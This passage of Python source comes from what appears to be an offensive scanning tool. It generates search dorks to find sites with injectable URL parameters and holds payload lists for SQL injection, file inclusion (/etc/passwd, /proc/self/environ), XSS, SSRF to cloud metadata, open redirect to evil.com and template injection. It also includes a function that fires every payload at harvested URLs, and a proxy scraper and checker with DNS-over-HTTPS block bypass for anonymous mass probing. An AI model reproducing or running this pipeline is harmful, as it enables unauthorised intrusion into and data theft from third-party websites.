            for d in PAGE_DIRS[:30]:
                for f in PAGE_FILES[:30]:
                    add("site:%s inurl:%s%s" % (dom, d, f))
                    if full():
                        return _dork_finish(out, n)
            if full():
                return _dork_finish(out, n)

    # ── NICHE ─────────────────────────────────────────────────────────────────
    elif mode == "niche":
        kws = NICHES.get(niche) or _all_niche_words()
        for k in kws:
            add("inurl:%s" % k)
            add("intitle:%s" % k)
            add("allintitle:%s" % k)
        for k in kws:
            for p in prs:
                add("intext:%s inurl:%s=" % (k, p))
                if full():
                    return _dork_finish(out, n)
        for k in kws:
            for f in PAGE_FILES:
                for d in PAGE_DIRS[:16]:
                    add("inurl:%s%s intext:%s" % (d, f, k))
                    if full():
                        return _dork_finish(out, n)

    # ── MIXED / HQ ────────────────────────────────────────────────────────────
    else:
        tpls = DORK_TEMPLATES
        i, stall = 0, 0
        while not full() and stall < n * 4 + 5000:
            before = len(out)
            f = PAGE_FILES[i % len(PAGE_FILES)]
            d = PAGE_DIRS[(i // 5) % len(PAGE_DIRS)]
            p = prs[(i // 7) % len(prs)]
            e = exts[(i // 11) % len(exts)]
            k = words[(i // 13) % len(words)]
            t = TLDS[(i // 17) % len(TLDS)]
            tpl = tpls[i % len(tpls)]
            try:
                s2 = tpl.format(f=f, p=p, d=d, e=e, k=k, t=t)
            except Exception:
                s2 = "inurl:%s?%s=" % (f, p)
            add(s2)
            if len(out) == before:
                stall += 1
            else:
                stall = 0
            i += 1

    if tld and mode not in ("site", "mixed"):
        base = list(out)
        for x in base[: max(0, n // 3)]:
            add("site:.%s %s" % (tld.strip().lstrip("."), x))
            if full():
                break
    return _dork_finish(out, n)


def _dork_finish(pool: list, n: int) -> list:
    """Quality sort + top n."""
    pool = _uniq(pool)
    if len(pool) > n:
        scored = sorted(((score_dork(x)[0], x) for x in pool), key=lambda z: -z[0])
        pool = [x for _, x in scored[:n]]
    else:
        pool = sorted(pool, key=lambda x: -score_dork(x)[0])
    return pool


def dork_gen(mode: str = "mixed", n: int = 50, niche: str = "", tld: str = "",
             domain: str = "", fresh: bool = False, mark: bool = True) -> dict:
    """Dork banao + fresh history handle karo. Returns dict."""
    dorks = make_dork(mode, n=n, niche=niche, tld=tld, domain=domain, fresh=fresh)
    new_cnt = dork_seen_add(dorks) if (mark and dorks) else 0
    return {"dorks": dorks, "new": new_cnt, "seen": dork_seen_count(),
            "asked": n, "mode": mode, "fresh": fresh}


def kw_clean(x) -> str:
    """Keyword/seed ko saaf karo — lowercase, extra spaces hatao."""
    x = " ".join(str(x or "").lower().split())
    x = re.sub(r"[^a-z0-9 \-']", " ", x)
    words = [w for w in x.split() if w not in KW_BAD]
    return " ".join(words[:6])[:70]


def kw_cores(items, limit: int = 800) -> list:
    """Seeds YA keyword list -> unique cores (max 800)."""
    if isinstance(items, str):
        items = re.split(r"[,\n;|]+", items)
    out = []
    for it in items or []:
        c = kw_clean(it)
        if len(c) < 3:
            continue
        out.append(c)
        if len(out) >= limit * 3:
            break
    return _uniq(out)[:limit]


def kw_capacity(cores) -> int:
    """In cores se max kitne unique keywords ban sakte hain (approx)."""
    per = (1 + len(KW_PRE) + len(KW_SUF) + len(KW_INTENT) + len(KW_TAIL)
           + len(KW_PRE) * len(KW_SUF) + len(KW_PRE) * len(KW_INTENT)
           + len(KW_SUF) * len(KW_INTENT) + len(KW_PRE) * len(KW_TAIL)
           + len(KW_TAIL) * len(KW_INTENT)
           + len(KW_PRE) * len(KW_SUF) * len(KW_INTENT)
           + len(KW_YEARS) * (len(KW_PRE) + len(KW_SUF) + len(KW_INTENT)))
    return per * max(1, len(cores))


def make_keywords(items, n: int = 200, exclude=None) -> list:
    """HQ keyword generator v2 — seeds YA keyword list se, 100000 tak.

    Layers simple->complex; early-exit hone par bhi quality theek rahe.
    """
    cores = kw_cores(items)
    if not cores:
        return []
    n = max(1, min(KW_MAX, int(n or 200)))
    seen = set(exclude or ())
    out = []

    def add(x):
        x = " ".join(str(x).split())
        if not x or x in seen or not (3 <= len(x) <= 70):
            return False
        seen.add(x)
        out.append(x)
        return True

    def full():
        return len(out) >= n

    # L0 — original cores
    for c in cores:
        add(c)
        if full():
            return out
    # L1 — pre + core
    for c in cores:
        for pre in KW_PRE:
            add(pre + " " + c)
            if full():
                return out
    # L2 — core + suf
    for c in cores:
        for suf in KW_SUF:
            add(c + " " + suf)
            if full():
                return out
    # L3 — core + intent
    for c in cores:
        for it in KW_INTENT:
            add(c + " " + it)
            if full():
                return out
    # L4 — core + tail (dorking-friendly long forms)
    for c in cores:
        for t in KW_TAIL:
            add(c + " " + t)
            if full():
                return out
    # L5 — pre + core + suf
    for c in cores:
        for pre in KW_PRE:
            for suf in KW_SUF:
                add("%s %s %s" % (pre, c, suf))
                if full():
                    return out
    # L6 — pre + core + intent
    for c in cores:
        for pre in KW_PRE:
            for it in KW_INTENT:
                add("%s %s %s" % (pre, c, it))
                if full():
                    return out
    # L7 — core + suf + intent
    for c in cores:
        for suf in KW_SUF:
            for it in KW_INTENT:
                add("%s %s %s" % (c, suf, it))
                if full():
                    return out
    # L8 — pre + core + tail
    for c in cores:
        for pre in KW_PRE:
            for t in KW_TAIL:
                add("%s %s %s" % (pre, c, t))
                if full():
                    return out
    # L9 — core + tail + intent
    for c in cores:
        for t in KW_TAIL:
            for it in KW_INTENT:
                add("%s %s %s" % (c, t, it))
                if full():
                    return out
    # L10 — pre + core + suf + intent (sabse bada pool)
    for c in cores:
        for pre in KW_PRE:
            for suf in KW_SUF:
                for it in KW_INTENT:
                    add("%s %s %s %s" % (pre, c, suf, it))
                    if full():
                        return out
    # L11 — year variants
    for c in cores:
        for y in KW_YEARS:
            for mod in KW_PRE[:10]:
                add("%s %s %s" % (mod, c, y))
                if full():
                    return out
            for mod in KW_SUF[:10]:
                add("%s %s %s" % (c, mod, y))
                if full():
                    return out
    return out


def kw_quality(kws) -> dict:
    """Keyword quality report — buckets + avg + top/worst."""
    kws = list(kws or [])
    if not kws:
        return {"total": 0, "avg": 0.0, "top": [], "worst": []}
    pairs = [(score_keyword(k)[0], k) for k in kws]
    scores = [p[0] for p in pairs]
    b = {"b80": 0, "b65": 0, "b45": 0, "b25": 0, "b0": 0}
    for sc in scores:
        if sc >= 80:
            b["b80"] += 1
        elif sc >= 65:
            b["b65"] += 1
        elif sc >= 45:
            b["b45"] += 1
        elif sc >= 25:
            b["b25"] += 1
        else:
            b["b0"] += 1
    top = [k for _, k in sorted(pairs, key=lambda z: -z[0])[:10]]
    worst = [k for _, k in sorted(pairs, key=lambda z: z[0])[:5]]
    d = {"total": len(kws), "avg": sum(scores) / len(scores), "top": top, "worst": worst}
    d.update(b)
    return d


def score_keyword(kw: str) -> tuple:
    kw = (kw or "").strip().lower()
    if not kw:
        return 0, ["khaali"]
    score, reasons = 50, []
    n = len(kw)
    if 8 <= n <= 45:
        score += 15
        reasons.append("+15 length theek")
    elif n > 60:
        score -= 15
        reasons.append("-15 bahut lamba")
    elif n < 5:
        score -= 12
        reasons.append("-12 bahut chhota")
    w = kw.split()
    if 2 <= len(w) <= 5:
        score += 12
        reasons.append("+12 %d words (search ke liye best)" % len(w))
    elif len(w) > 7:
        score -= 10
        reasons.append("-10 bahut zyada words")
    if re.search(r"\b(how|what|why|best|top|guide|review|price|buy|download)\b", kw):
        score += 10
        reasons.append("+10 intent word")
    if re.search(r"\d{4}", kw):
        score -= 5
        reasons.append("-5 saal wala number (jaldi purana)")
    if len(set(w)) < len(w) * 0.6:
        score -= 10
        reasons.append("-10 repeat words")
    if re.search(r"[^a-z0-9 \-]", kw):
        score -= 8
        reasons.append("-8 special char")
    return max(0, min(100, score)), reasons


# ── URL REVERSE ──────────────────────────────────────────────────────────────
def url_reverse(url: str) -> dict:
    """URL ko toda + usse banaye ja sakne wale dorks."""
    raw = (url or "").strip()
    if not raw:
        return {}
    if "://" not in raw:
        raw = "http://" + raw
    try:
        u = urlparse(raw)
    except Exception:
        return {}
    host = (u.hostname or "").lower()
    parts = host.split(".")
    tld = ".".join(parts[-2:]) if len(parts) >= 2 else host
    path = u.path or "/"
    segs = [s for s in path.split("/") if s]
    fname = segs[-1] if segs else ""
    ext = fname.rsplit(".", 1)[-1].lower() if "." in fname else ""
    dirs = segs[:-1]
    qs = parse_qs(u.query or "", keep_blank_values=True)
    params = list(qs.keys())
    return {
        "raw": raw, "host": host, "tld": tld, "sub": ".".join(parts[:-2]) if len(parts) > 2 else "",
        "path": path, "dirs": dirs, "file": fname, "ext": ext,
        "params": params, "values": {k: v[:1] for k, v in list(qs.items())[:15]},
    }


def url_reverse_dorks(info: dict, n: int = 20) -> list:
    if not info:
        return []
    out = []
    h, f, e, p = info.get("host", ""), info.get("file", ""), info.get("ext", ""), info.get("params", [])
    d = "/".join(info.get("dirs", [])[:2])
    if d:
        d += "/"
    if f:
        out.append("inurl:%s%s" % (d, f))
        out.append('inurl:"%s%s"' % (d, f))
        out.append("allinurl:%s%s" % (d, f))
    for prm in p:
        if f:
            out.append("inurl:%s%s?%s=" % (d, f, prm))
        out.append("inurl:%s=" % prm)
        out.append('inurl:"%s="' % prm)
    if e:
        out.append("filetype:%s" % e)
        out.append("filetype:%s inurl:%s" % (e, (f.rsplit(".", 1)[0] if f else "")))
    if h:
        out.append("site:%s" % h)
    if info.get("tld"):
        base = (f.rsplit(".", 1)[0] if f else (p[0] if p else ""))
        if base:
            out.append("site:.%s inurl:%s" % (info["tld"], base))
    if p and f:
        out.append("inurl:%s?%s=" % (f, p[0]))
    return _uniq([x for x in out if x and "inurl:= " not in x])[:n]


# ── RANDOMIZER ───────────────────────────────────────────────────────────────
OP_MUTATE = [
    ("inurl:", ["inurl:", "allinurl:", "intext:", "intitle:"]),
    ("site:", ["site:", "site:.com", "site:.net", "site:.org"]),
    ("filetype:", ["filetype:", "ext:"]),
]


def randomize_dorks(dorks: list, n: int = 30, mutate: bool = True) -> list:
    src = _uniq([d for d in (dorks or []) if d])
    if not src:
        return []
    n = max(1, min(1000, int(n or 30)))
    out = _uniq(list(src))
    if not mutate:
        out = out[:]
        while len(out) < n:
            out += src
        random.shuffle(out)
        return out[:n]

    seen = set(src)
    guard = 0
    while len(seen) < n and guard < n * 80:
        guard += 1
        d = random.choice(list(seen))
        m = d
        # 1) operator swap
        for op, reps in OP_MUTATE:
            if op in m.lower() and random.random() < 0.75:
                m = re.sub(re.escape(op), random.choice(reps), m, count=1, flags=re.I)
                break
        # 2) quotes
        if random.random() < 0.3:
            m = m.replace('"', "") if '"' in m else m.replace("inurl:", 'inurl:"', 1) + '"'
        # 3) param value
        if random.random() < 0.3:
            m = re.sub(r"=([A-Za-z0-9]*)", lambda z: "=" + random.choice(
                ["1", "2", "0", "a", "", "id", "test"]), m, count=1)
        # 4) tld swap
        if random.random() < 0.25 and re.search(r"site:\S+", m):
            m = re.sub(r"site:\S+", "site:." + random.choice(TLDS), m)
        if m != d and m not in seen:
            seen.add(m)
            out.append(m)
    out = _uniq(out)
    random.shuffle(out)
    return out[:n]


# ── INJECTOR ─────────────────────────────────────────────────────────────────
PAYLOAD_CATS = {
    "sqli": [
        "'", '"', "1'", "1)", "1 AND 1=1", "1 AND 1=2", "1' AND '1'='1",
        "1' AND '1'='2", "' OR '1'='1", "' OR 1=1-- -", "1 UNION SELECT NULL-- -",
        "1 UNION SELECT NULL,NULL-- -", "' AND SLEEP(5)-- -", "1;WAITFOR DELAY '0:0:5'--",
        "' AND 1=CONVERT(int,@@version)-- -", "1' ORDER BY 1-- -", "1' ORDER BY 99-- -",
        "admin'-- -", "' OR 'x'='x", "1%20AND%201=1", "1%27", "%27",
    ],
    "lfi": [
        "../../../../etc/passwd", "..%2f..%2f..%2f..%2fetc%2fpasswd",
        "....//....//....//etc/passwd", "/etc/passwd", "php://filter/convert.base64-encode/resource=index",
        "php://filter/read=convert.base64-encode/resource=config", "/proc/self/environ",
        "C:\\Windows\\win.ini", "..\\..\\..\\windows\\win.ini",
        "/etc/hosts", "%2e%2e%2f%2e%2e%2fetc%2fpasswd", "file:///etc/passwd",
    ],
    "xss": [
        "<script>alert(1)</script>", '"><script>alert(1)</script>', "'><svg onload=alert(1)>",
        "javascript:alert(1)", "%3Cscript%3Ealert(1)%3C/script%3E",
        '"><img src=x onerror=alert(1)>', "'-alert(1)-'", "\"><svg/onload=alert(1)>",
    ],
    "ssrf": [
        "http://127.0.0.1", "http://localhost", "http://169.254.169.254/latest/meta-data/",
        "http://[::1]", "http://0.0.0.0", "http://127.0.0.1:22", "http://127.0.0.1:80",
        "file:///etc/passwd", "dict://127.0.0.1:6379/info", "gopher://127.0.0.1:6379/_INFO",
    ],
    "redirect": [
        "https://evil.com", "//evil.com", "https://evil.com/%2f..", "/\\evil.com",
        "https://evil.com?x=1", "///evil.com", "http://evil.com@target.com",
        "https://target.com@evil.com",
    ],
    "ssti": [
        "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{{7*'7'}}",
        "{{config}}", "{{self.__class__}}", "${{7*7}}",
    ],
}
PAYLOADS = _uniq([x for v in PAYLOAD_CATS.values() for x in v])
PARAM_FUZZ = ["id", "page", "cat", "item", "product_id", "user", "file", "path", "url", "search"]
CAT_LABEL = {"all": "🎯 ALL", "sqli": "💉 SQLi", "lfi": "📂 LFI", "xss": "🧪 XSS",
             "ssrf": "🌐 SSRF", "redirect": "↪️ REDIRECT", "ssti": "🧬 SSTI"}


def inject_targets(urls: list, payload: str = "", params: list = None) -> list:
    """Har URL ke params me payload daal ke injection URLs banao."""
    pl = payload if payload is not None else "'"
    params = params or PARAM_FUZZ
    out = []
    for raw in (urls or [])[:500]:
        raw = (raw or "").strip()
        if not raw or not raw.startswith("http"):
            continue
        info = url_reverse(raw)
        pnames = info.get("params") or []
        if pnames:
            for p in pnames[:6]:
                sep = "&" if "?" in raw else "?"
                out.append("%s%s%s=%s" % (raw.split("?")[0], sep, p, quote_plus(pl)))
        else:
            base = raw.split("?")[0].rstrip("/")
            for p in params[:6]:
                out.append("%s?%s=%s" % (base, p, quote_plus(pl)))
    return _uniq(out)


def payloads_for(cat: str = "all") -> list:
    if not cat or cat == "all":
        return list(PAYLOADS)
    return list(PAYLOAD_CATS.get(cat) or PAYLOADS)


def inject_all_payloads(urls: list, cat: str = "all") -> list:
    out = []
    for pl in payloads_for(cat):
        out += inject_targets(urls, pl)
    return _uniq(out)


# ═══════════════════════════════════════════════════════════════════════════════
#  PROXY ENGINE — 45 sources + DoH bypass + very fast checker
# ═══════════════════════════════════════════════════════════════════════════════
PROXY_SOURCES = [
    # ── jsDelivr CDN (GitHub raw ka mirror — raw.githubusercontent block ho to bhi chalta hai)
    ("text", "https://cdn.jsdelivr.net/gh/TheSpeedX/PROXY-List@master/http.txt"),
    ("text", "https://cdn.jsdelivr.net/gh/TheSpeedX/PROXY-List@master/socks4.txt"),
    ("text", "https://cdn.jsdelivr.net/gh/TheSpeedX/PROXY-List@master/socks5.txt"),
    ("text", "https://cdn.jsdelivr.net/gh/monosans/proxy-list@main/proxies/http.txt"),
    ("text", "https://cdn.jsdelivr.net/gh/monosans/proxy-list@main/proxies/socks5.txt"),
    ("text", "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/http/data.txt"),
    ("text", "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks5/data.txt"),
    ("text", "https://cdn.jsdelivr.net/gh/prxchk/proxy-list@main/http.txt"),
    ("text", "https://cdn.jsdelivr.net/gh/zloi-user/hideip.me@main/http.txt"),
    ("text", "https://cdn.jsdelivr.net/gh/vakhov/fresh-proxy-list@master/http.txt"),
    ("text", "https://cdn.jsdelivr.net/gh/vakhov/fresh-proxy-list@master/socks5.txt"),
    ("text", "https://cdn.jsdelivr.net/gh/roosterkid/openproxylist@main/HTTPS_RAW.txt"),
    ("text", "https://cdn.jsdelivr.net/gh/hookzof/socks5_list@master/proxy.txt"),
    ("text", "https://cdn.jsdelivr.net/gh/mmpx12/proxy-list@master/http.txt"),
    ("text", "https://cdn.jsdelivr.net/gh/mmpx12/proxy-list@master/socks5.txt"),
    ("text", "https://cdn.jsdelivr.net/gh/clarketm/proxy-list@master/proxy-list-raw.txt"),
    # ── Statically CDN (dusra mirror domain)
    ("text", "https://cdn.statically.io/gh/TheSpeedX/PROXY-List/master/http.txt"),
    ("text", "https://cdn.statically.io/gh/monosans/proxy-list/main/proxies/http.txt"),
    # ── gitHack (teesra mirror)
    ("text", "https://raw.githack.com/TheSpeedX/PROXY-List/master/http.txt"),
    ("text", "https://raw.githack.com/monosans/proxy-list/main/proxies/http.txt"),
    # ── GitHub via github.com domain (raw.* blocked ho to ye chal sakta hai)
    ("text", "https://github.com/TheSpeedX/PROXY-List/raw/master/http.txt"),
    ("text", "https://github.com/monosans/proxy-list/raw/main/proxies/http.txt"),
    # ── raw.githubusercontent (purane sources — jo chal rahe hain unke liye)
    ("text", "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"),
    ("text", "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt"),
    ("text", "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt"),
    ("text", "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt"),
    # ── API feeds (plain text)
    ("text", "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"),
    ("text", "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all"),
    ("text", "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all"),
    ("text", "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&protocol=http&proxy_format=ipport&format=text"),
    ("text", "https://www.proxy-list.download/api/v1/get?type=http"),
    ("text", "https://www.proxy-list.download/api/v1/get?type=https"),
    ("text", "https://www.proxy-list.download/api/v1/get?type=socks5"),
    ("text", "https://openproxylist.xyz/http.txt"),
    ("text", "https://openproxylist.xyz/socks5.txt"),
    ("text", "https://proxyspace.pro/http.txt"),
    ("text", "https://proxyspace.pro/https.txt"),
    ("text", "https://proxyspace.pro/socks5.txt"),
    # ── JSON APIs
    ("json", "https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc"),
    ("json", "https://proxylist.geonode.com/api/proxy-list?limit=500&page=2&sort_by=lastChecked&sort_type=desc"),
    ("json", "https://sunny9577.github.io/proxy-scraper/proxies.json"),
    # ── github.io mirror pages
    ("text", "https://hookzof.github.io/socks5_list/proxy.txt"),
    ("text", "https://thespeedx.github.io/PROXY-List/http.txt"),
    ("text", "https://monosans.github.io/proxy-list/proxies/http.txt"),
    ("text", "https://proxifly.github.io/free-proxy-list/proxies/protocols/http/data.txt"),
]

UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
]
UA = {"User-Agent": random.choice(UA_LIST),
      "Accept": "text/html,application/json,*/*",
      "Accept-Language": "en-US,en;q=0.9"}

IP_PORT = re.compile(r"(?<!\d)(\d{1,3}(?:\.\d{1,3}){3})\s*[:\s,;|]\s*(\d{2,5})(?!\d)")
PROTO_URL = re.compile(r"(?:(http|https|socks4|socks5)://)?(?:[\w.:-]+@)?(\d{1,3}(?:\.\d{1,3}){3}):(\d{2,5})")

PROXIES = []          # [{url, proto, host, port, ms, ok, fails}]
_PROXY_CACHE = {"t": 0.0, "data": []}
PSTATS = {"sources_total": len(PROXY_SOURCES), "sources_ok": 0, "raw": 0, "hosts": []}


def _valid_ip(ip: str) -> bool:
    p = ip.split(".")
    if len(p) != 4:
        return False
    try:
        return all(0 <= int(x) <= 255 for x in p)
    except Exception:
        return False


def parse_proxies(text: str) -> list:
    """6 format: ip:port / ip port / ip,port / proto://ip:port / JSON data|proxies|results"""
    out = []
    t = text or ""
    st = t.strip()
    if st[:1] in "[{":
        try:
            j = json.loads(st)
            rows = []
            if isinstance(j, list):
                rows = j
            elif isinstance(j, dict):
                for key in ("data", "proxies", "results", "list", "proxy"):
                    if isinstance(j.get(key), list):
                        rows = j[key]
                        break
                else:
                    rows = [j]
            for r in rows:
                if not isinstance(r, dict):
                    continue
                ip = str(r.get("ip") or r.get("host") or r.get("ipAddress") or "").strip()
                port = r.get("port") or r.get("portNumber") or ""
                proto = str(r.get("protocols") or r.get("protocol") or r.get("type") or "http")
                if isinstance(proto, list):
                    proto = proto[0] if proto else "http"
                proto = "socks5" if "socks5" in str(proto).lower() else (
                    "socks4" if "socks4" in str(proto).lower() else (
                        "https" if "https" in str(proto).lower() else "http"))
                if ip and str(port).isdigit() and _valid_ip(ip):
                    out.append("%s://%s:%s" % (proto, ip, int(port)))
        except Exception:
            pass
    used = []   # proto URL ne jo span le liya, IP_PORT usko skip kare
    for m in PROTO_URL.finditer(t):
        proto = (m.group(1) or "http").lower()
        ip, port = m.group(2), int(m.group(3))
        if _valid_ip(ip) and 1 <= port <= 65535:
            out.append("%s://%s:%d" % (proto, ip, port))
            used.append((m.start(2), m.end(3)))
    for m in IP_PORT.finditer(t):
        s0, e0 = m.start(1), m.end(2)
        if any(s0 < ue and e0 > us for us, ue in used):
            continue
        ip, port = m.group(1), int(m.group(2))
        if _valid_ip(ip) and 1 <= port <= 65535:
            out.append("http://%s:%d" % (ip, port))
    return _uniq(out)


_DNS_CACHE = {}


async def doh_resolve(host: str, session=None) -> str:
    """DNS-over-HTTPS — DNS block ho to bhi IP mil jaye."""
    if host in _DNS_CACHE:
        return _DNS_CACHE[host]
    ip = ""
    for url, params in (("https://1.1.1.1/dns-query", {"name": host, "type": "A"}),
                        ("https://8.8.8.8/resolve", {"name": host, "type": "A"})):
        try:
            async with aiohttp.ClientSession() as s:
                async with s.get(url, params=params, headers={"Accept": "application/dns-json"},
                                 timeout=aiohttp.ClientTimeout(total=6), ssl=False) as r:
                    if r.status == 200:
                        j = await r.json(content_type=None)
                        for a in (j.get("Answer") or []):
                            cand = str(a.get("data") or "")
                            if _valid_ip(cand):
                                ip = cand
                                break
        except Exception:
            ip = ""
        if ip:
            break
    _DNS_CACHE[host] = ip
    return ip


async def fetch_source(session, kind: str, url: str, timeout: float = 12.0) -> tuple:
    """Ek source fetch → (url, proxies, raw_lines, ok). DoH fallback ke saath."""
    raw = ""
    for attempt in (1, 2):
        try:
            async with session.get(url, headers=UA, timeout=aiohttp.ClientTimeout(total=timeout),
                                   ssl=False, allow_redirects=True) as r:
                if r.status == 200:
                    raw = await r.text(errors="ignore")
                    break
        except Exception:
            raw = ""
        if attempt == 1:
            await asyncio.sleep(0.3)
    if not raw:
        try:
            u = url.split("/", 3)
            host = u[2]
            path = "/" + (u[3] if len(u) > 3 else "")
            ip = await doh_resolve(host)
            if ip:
                hdrs = dict(UA)
                hdrs["Host"] = host
                async with aiohttp.ClientSession() as s2:
                    async with s2.get("https://%s%s" % (ip, path), headers=hdrs,
                                      timeout=aiohttp.ClientTimeout(total=timeout),
                                      ssl=False, allow_redirects=True) as r2:
                        if r2.status == 200:
                            raw = await r2.text(errors="ignore")
        except Exception:
            raw = ""
    if not raw:
        return url, [], 0, False
    return url, parse_proxies(raw), len(raw.splitlines()), True


async def scrape_proxies(progress=None, force: bool = False, timeout: float = 12.0) -> list:
    """Saare sources parallel me — 45 sources, ek saath."""
    now = time.time()
    if not force and (now - _PROXY_CACHE["t"] < 120) and _PROXY_CACHE["data"]:
        return list(_PROXY_CACHE["data"])
    PSTATS.update({"sources_total": len(PROXY_SOURCES), "sources_ok": 0, "raw": 0, "hosts": []})
    found = []
    done = 0
    lock = asyncio.Lock()
    conn = aiohttp.TCPConnector(limit=100, limit_per_host=8, ssl=False, ttl_dns_cache=300)
    async with aiohttp.ClientSession(connector=conn) as session:
        async def one(kind, url):
            nonlocal done
            u, px, lines, ok = await fetch_source(session, kind, url, timeout)
            async with lock:
                done += 1
                if ok:
                    PSTATS["sources_ok"] += 1
                    PSTATS["raw"] += lines
                    try:
                        h = url.split("/")[2]
                        if h not in PSTATS["hosts"]:
                            PSTATS["hosts"].append(h)
                    except Exception:
                        pass
                    found.extend(px)
                if progress and done % 5 == 0:
                    try:
                        await progress({"done": done, "total": len(PROXY_SOURCES),
                                        "ok": PSTATS["sources_ok"], "px": len(found)})
                    except Exception:
                        pass
        await asyncio.gather(*[one(k, u) for k, u in PROXY_SOURCES], return_exceptions=True)
    uniq = _uniq(found)
    _PROXY_CACHE.update({"t": time.time(), "data": uniq})
    return uniq


# ── very fast checker ────────────────────────────────────────────────────────
CHECK_TARGETS = [
    ("http://httpbin.org/ip", 5000),
    ("http://api.ipify.org?format=json", 5000),
    ("http://ifconfig.me/ip", 6000),
    ("http://ip-api.com/json", 6000),
]


async def check_one(session, proxy: str, sem: asyncio.Semaphore, timeout: float = 6.0):
    url, _t = CHECK_TARGETS[random.randrange(len(CHECK_TARGETS))]
    async with sem:
        t0 = time.perf_counter()
        try:
            async with session.get(url, proxy=proxy, headers=UA,
                                   timeout=aiohttp.ClientTimeout(total=timeout),
                                   ssl=False, allow_redirects=True) as r:
                if r.status == 200:
                    body = await r.text(errors="ignore")
                    if len(body) < 3000 and re.search(r"\d{1,3}(?:\.\d{1,3}){3}", body):
                        ms = int((time.perf_counter() - t0) * 1000)
                        return {"url": proxy, "ms": ms, "ok": True}
        except Exception:
            pass
    return {"url": proxy, "ok": False}


async def check_proxies(proxies: list, concurrency: int = 400, timeout: float = 6.0,
                        progress=None, want: int = 0) -> list:
    """High concurrency checker — phone pe bhi 400 parallel."""
    good = []
    sem = asyncio.Semaphore(max(20, min(1000, concurrency)))
    conn = aiohttp.TCPConnector(limit=0, ssl=False, force_close=True)
    total = len(proxies)
    done = 0
    lock = asyncio.Lock()
    async with aiohttp.ClientSession(connector=conn) as session:
        tasks = []
        for p in proxies:
            tasks.append(asyncio.create_task(check_one(session, p, sem, timeout)))
        for fut in asyncio.as_completed(tasks):
            res = await fut
            async with lock:
                done += 1
                if res.get("ok"):
                    good.append(res)
                if progress and done % 25 == 0:
                    try:
                        await progress({"done": done, "total": total, "alive": len(good)})
                    except Exception:
                        pass
            if want and len(good) >= want:
                for t in tasks:
                    if not t.done():
                        t.cancel()
                break
    good.sort(key=lambda x: x.get("ms", 99999))
    return good


def save_proxy_pool(good: list) -> None:
    global PROXIES
    PROXIES = good
    jsave("proxies", {"at": datetime.now().isoformat(timespec="seconds"),
                      "list": [{"url": g["url"], "ms": g.get("ms", 0)} for g in good]})


def load_proxy_pool() -> list:
    global PROXIES
    if PROXIES:
        return PROXIES
    d = jload("proxies", {})
    PROXIES = [{"url": x["url"], "ms": x.get("ms", 0), "ok": True} for x in (d.get("list") or [])]
    return PROXIES


def manual_proxies() -> list:
    """data/manual_proxies.txt — 1 line = 1 proxy."""
    p = os.path.join(DATA_DIR, "manual_proxies.txt")
    if not os.path.exists(p):
        return []
    try:
        with open(p, encoding="utf-8", errors="ignore") as f:
            return parse_proxies(f.read())
    except Exception:
        return []


# ═══════════════════════════════════════════════════════════════════════════════
#  PARSER — asli search engines, asli URLs
# ═══════════════════════════════════════════════════════════════════════════════
JUNK_HOSTS = {
    "duckduckgo.com", "google.com", "www.google.com", "bing.com", "www.bing.com",
    "yahoo.com", "search.yahoo.com", "mojeek.com", "www.mojeek.com", "brave.com",
    "search.brave.com", "startpage.com", "yandex.com", "yandex.ru", "baidu.com",
    "facebook.com", "twitter.com", "x.com", "instagram.com", "linkedin.com",
    "youtube.com", "pinterest.com", "tiktok.com", "reddit.com", "quora.com",
    "wikipedia.org", "amazon.com", "ebay.com", "w3.org", "schema.org",
    "github.com", "gitlab.com", "stackoverflow.com", "medium.com", "blogspot.com",
    "searx.be", "searxng.site", "priv.au", "search.bus-hit.me", "baresearch.org",
}
JUNK_EXT = {".css", ".js", ".woff", ".woff2", ".ttf", ".eot", ".ico", ".svg", ".png",
            ".jpg", ".jpeg", ".gif", ".webp", ".mp4", ".mp3", ".avi", ".map"}

ENGINE_URLS = {
    "ddg":       "https://html.duckduckgo.com/html/?q={q}&s={p}",
    "bing":      "https://www.bing.com/search?q={q}&first={p}&count=30&setlang=en",
    "mojeek":    "https://www.mojeek.com/search?q={q}&s={p}",
    "yahoo":     "https://search.yahoo.com/search?p={q}&b={p}&n=30",
    "brave":     "https://search.brave.com/search?q={q}&offset={p}",
    "startpage": "https://www.startpage.com/sp/search?query={q}&page={p}",
    "google":    "https://www.google.com/search?q={q}&num=30&hl=en&start={p}",
    "yandex":    "https://yandex.com/search/?text={q}&p={p}",
    "qwant":     "https://www.qwant.com/?q={q}&p={p}&t=web",
    "ecosia":    "https://www.ecosia.org/search?q={q}&p={p}",
    "marginalia": "https://search.marginalia.nu/search?query={q}&s={p}",
    "searx":     "https://searx.be/search?q={q}&format=json&pageno={p}",
}

# (start, step) — har engine ka pagination offset
ENGINE_PAGE = {
    "ddg": (0, 30), "bing": (1, 10), "mojeek": (0, 10), "yahoo": (1, 10),
    "google": (0, 30), "brave": (0, 20), "startpage": (1, 10), "yandex": (0, 10),
    "qwant": (1, 10), "ecosia": (1, 10), "marginalia": (0, 10), "searx": (1, 1),
    "sxng": (1, 1),
}

ENGINE_ORDER = ["sxng", "ddg", "bing", "mojeek", "yahoo", "brave", "startpage",
